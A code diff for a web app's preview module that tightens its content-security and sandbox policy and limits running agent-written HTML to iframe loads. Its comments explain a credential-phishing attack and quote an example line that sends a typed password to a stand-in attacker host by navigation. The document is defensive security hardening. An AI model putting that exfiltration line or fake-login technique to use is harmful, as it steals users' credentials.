@@ -197,47 +197,41 @@ export interface PreviewCsp {
  * frame the preview (clickjacking / re-embed defense).
  *
  * On top of that, the header copy carries **`sandbox allow-scripts` and nothing
- * else**. The sandbox is what makes executing agent script survivable at all: it
- * drops the response into an OPAQUE origin (no first-party origin to act on) and
- * — the reason it is here — it is the ONLY thing in this policy that restricts
- * navigation of the TOP-LEVEL browsing context. Without it, a preview opened
- * top-level (new tab, shared link) can `location = "…/login"` and phish real
- * credentials on a real first-party origin (GHSA-8f6g-r37m-wg99). Tokens
- * deliberately NOT granted:
+ * else**, which drops the response into an OPAQUE origin. Measured in Chrome
+ * against a server sending exactly this header: `window.origin === "null"`,
+ * `localStorage` / `sessionStorage` / `document.cookie` throw `SecurityError`,
+ * and `window.open` returns null. Tokens deliberately NOT granted:
  *
- *  - `allow-popups` / `allow-popups-to-escape-sandbox` — a popup to the app's
- *    `/login` reopens the exact phishing chain this closes.
- *  - `allow-top-navigation` / `allow-top-navigation-by-user-activation` — the
- *    attack IS a user-initiated click, so the "by user activation" variant grants
- *    precisely the capability being removed.
  *  - `allow-same-origin` — hands the document back a real origin and defeats the
  *    entire control.
+ *  - `allow-popups` / `allow-popups-to-escape-sandbox` — a popup would be an
+ *    attacker-controlled window opened from a hostname the user trusts.
+ *  - `allow-top-navigation` / `allow-top-navigation-by-user-activation` — the
+ *    embedded frame must never steer the tab around it, and the "by user
+ *    activation" variant is worthless here because the attack IS a click.
  *
- * What this does and does NOT cost the user, per loading context — a sandboxed
- * navigable may ALWAYS navigate ITSELF, the flags only gate navigating a
- * TOP-LEVEL browsing context:
+ * What the sandbox does NOT buy — measured, not assumed: it does not stop the
+ * document navigating ITSELF. The sandboxed-top-level-navigation flags gate
+ * navigating an ANCESTOR browsing context only; a sandboxed navigable may always
+ * replace its own content, so `location = …`, `<meta http-equiv="refresh">` and
+ * a plain `<a href>` click all succeed. That is why a top-level load is never
+ * served as active HTML ({@link mayServeActiveHtml}) rather than served under a
+ * stricter policy: loaded top-level the agent document IS the navigable, so it
+ * can be the fake login form itself and carry the typed-in credentials out in a
+ * navigation URL — a channel no CSP directive covers.
  *
- *  - **Top-level load** (a `USERCONTENT_URL` preview opened in a new tab or via
- *    a shared link): the document IS the top-level browsing context, so a plain
- *    `<a href="https://…">` click, a `location = …` and a `<meta http-equiv=
- *    "refresh">` are all blocked. That is the phishing fix, and the accepted
- *    cost of it.
- *  - **Inside the SPA's preview modal iframe**: the document is a NESTED
- *    navigable, so a plain no-target link still navigates the frame in place —
- *    it is not disabled. `target="_blank"` and `target="_top"` are dead, but
- *    they were already dead before this policy existed, because the iframe
- *    element has carried `sandbox="allow-scripts"` all along. Nothing about the
- *    modal path changed here.
- *
- * LIMITATION (pre-existing, unchanged by this policy): because self-navigation
- * is always allowed, an agent document rendered in the modal can still replace
- * its OWN frame with an arbitrary page. Constraining that needs a `frame-src`
- * directive on the SPA's own response — the app currently sends no CSP at all,
- * so there is nothing here to hook it onto.
+ * Where active HTML IS served — a nested frame, the SPA's preview modal — that
+ * same self-navigation freedom means the agent document can replace its OWN
+ * frame with an arbitrary page. Constraining that needs a `frame-src` directive
+ * on the SPA's own response, not something this policy can do. Tracked as a
+ * separate gap.
  *
  * The embedding iframe declares the SAME token set (`PREVIEW_IFRAME_SANDBOX` in
  * `apps/web/src/components/document-preview.tsx`) and the two sandboxes
- * INTERSECT, so the sets must move together or not at all.
+ * INTERSECT, so the sets must move together or not at all. The header copy is
+ * not redundant with the attribute: `frame-ancestors` lets ANY page on the app
+ * origin frame the preview, so the header is what still applies if a future
+ * embedder forgets the attribute.
  *
  * The `<meta>` copy omits `sandbox`, because the directive is IGNORED in a meta
  * context (per spec — a document cannot sandbox itself after parsing has begun).
@@ -270,48 +264,45 @@ export function buildPreviewCsp(appOrigin: string): PreviewCsp {
  * serve the same bytes relabelled `text/plain`, so the browser shows the source
  * instead of running it).
  *
- * The CSP built by {@link buildPreviewCsp} blocks exfiltration (`connect-src`,
- * `form-action`, `img-src`, `base-uri`) but NOT script execution itself — that
- * is by design, the page has to render. Whether execution is harmless depends
- * entirely on WHICH origin the script ends up running in:
+ * The answer depends on the LOADING CONTEXT and on nothing else. Active HTML
+ * requires a proven NESTED-document load (`Sec-Fetch-Dest: iframe`) — in EVERY
+ * mode, whether or not `USERCONTENT_URL` is configured. There is no
+ * separate-origin escape hatch, because a TOP-LEVEL render of an agent-authored
+ * document cannot be contained by anything the response can carry:
  *
- *  - **Separate `USERCONTENT_URL` origin** — safe. The script runs on a
- *    throwaway domain with its own cookie jar and storage partition; it cannot
- *    reach the app's session no matter how the response is loaded. `active`
- *    unconditionally. This branch trusts that the configured origin really is
- *    separate, which is why the env schema (`@appstrate/env`) refuses to boot
- *    when `USERCONTENT_URL` shares `APP_URL`'s host — presence must never be
- *    taken as proof of separation on its own.
- *  - **Same-origin mode (`USERCONTENT_URL` unset — the OSS default)** — safe
- *    ONLY inside the SPA's `sandbox="allow-scripts"` iframe, which gives the
- *    document an opaque origin. `preview_url` is an absolute URL with a 300 s
- *    token, so it can also be opened TOP-LEVEL (new tab, shared link). There
- *    the sandbox attribute does not exist: the script runs on `APP_URL` with
- *    full access to the SPA's `localStorage`/`sessionStorage`, non-HttpOnly
- *    cookies, and same-origin navigation. That is the hole this closes. (The
- *    header's `sandbox allow-scripts` is a SECOND, independent layer over the
- *    same hole — it revokes the origin even when the bytes ARE parsed as a
- *    document. This gate is kept because it stops the parse from happening at
- *    all, so it holds without relying on a UA honouring a CSP directive.)
+ *  - The CSP built by {@link buildPreviewCsp} blocks exfiltration (`connect-src`,
+ *    `form-action`, `img-src`, `base-uri`) but NOT script execution itself —
+ *    that is by design, the page has to render.
+ *  - Its `sandbox allow-scripts` revokes the document's origin, but a sandboxed
+ *    navigable may ALWAYS navigate ITSELF (the sandboxed-top-level-navigation
+ *    flags only gate navigating an ANCESTOR). Verified in Chrome against a real
+ *    server sending that header: on a top-level load `location = …`,
+ *    `<meta http-equiv="refresh">` and a plain `<a href>` click all succeed.
+ *  - So the attack is not "reach the app's session". It is that the agent
+ *    document IS the fake login page, rendered top-level on a hostname the user
+ *    trusts, exfiltrating whatever is typed into it BY NAVIGATION
+ *    (`location = "https://evil.example/?p=" + password`). No CSP directive
+ *    covers that channel. Refusing the render is the only control that does.
+ *
+ * A separate `USERCONTENT_URL` origin therefore grants no exemption here. It is
+ * still worth configuring for a different reason: it gives the preview its own
+ * cookie jar, storage partition and process (site isolation), and unlike a CSP
+ * it survives a proxy that strips response headers or a UA that ignores
+ * `sandbox`. What it cannot do is make a top-level render containable.
  *
  * `Sec-Fetch-Dest` is a browser-set, script-unforgeable header, so it is the
- * authoritative statement of the loading context. In same-origin mode the
- * decision is fail-CLOSED: active HTML requires a proven nested-document load
- * (`iframe`); a top-level navigation (`document`), a bare `fetch` (`empty`),
+ * authoritative statement of the loading context, and the decision is
+ * fail-CLOSED: a top-level navigation (`document`), a bare `fetch` (`empty`),
  * an `object`/`embed` load, and a MISSING header (non-browser client, or a
  * browser too old to send it — Safari < 16.4) all degrade to inert source.
  * Degrading rather than erroring keeps the link useful: the holder of a valid
- * token may read the source, which it could download anyway — it just cannot
- * make it execute in the app origin.
+ * token may read the source, which it could download anyway — the bytes are
+ * simply never parsed as a document.
+ *
+ * @param secFetchDest Raw `Sec-Fetch-Dest` request header, or null when absent.
  */
-export function mayServeActiveHtml(input: {
-  /** True when the preview is served from a dedicated `USERCONTENT_URL` origin. */
-  separateOrigin: boolean;
-  /** Raw `Sec-Fetch-Dest` request header, or null when absent. */
-  secFetchDest: string | null;
-}): boolean {
-  if (input.separateOrigin) return true;
-  return input.secFetchDest === "iframe";
+export function mayServeActiveHtml(secFetchDest: string | null): boolean {
+  return secFetchDest === "iframe";
 }
 
 /**
